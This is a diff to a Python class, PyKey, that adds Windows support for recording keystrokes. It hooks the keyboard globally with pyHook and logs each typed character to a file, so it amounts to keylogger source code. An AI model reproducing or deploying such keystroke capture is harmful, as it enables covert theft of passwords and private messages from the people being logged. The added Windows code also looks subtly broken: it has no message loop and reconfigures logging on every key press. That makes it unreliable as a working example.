@@ -132,7 +132,7 @@ class PyKey:
 
 
     def record(self):
-        """ Record strategy for OSX
+        """ Record strategy for OSX and Linux
             Arguments:
                 self (PyKey): self instance
         """
@@ -141,6 +141,28 @@ class PyKey:
             on_release = self.onRelease) as listener:
             listener.join()
 
+    def recordWindows(self):
+        """ Record strategy for Windows
+            Arguments:
+                self (PyKey): self instance
+        """
+        import pyHook, pythoncom, sys
+        import time, datetime
+
+        hooks_manager = pyHook.HookManager()
+        hooks_manager.KeyDown = self.onKeyboardWinEvent
+        hooks_manager.HookKeyboard()
+
+    def onKeyboardWinEvent(self, event):
+        logging.basicConfig(
+            filename=self.LOG_FILE,
+            filemode='w',
+            level=logging.DEBUG,
+            format='%(message)s')
+        logging.log(10, chr(event.Ascii))
+
+        return True
+
     def recordKeys(self):
         """ Records the keys following a strategy depending on the operating system
             Arguments:
@@ -148,6 +170,8 @@ class PyKey:
         """
         if self.os == 'osx' or self.os == 'linux':
             self.record()
+        else:
+            self.recordWindows()
 
 
     def start(self):
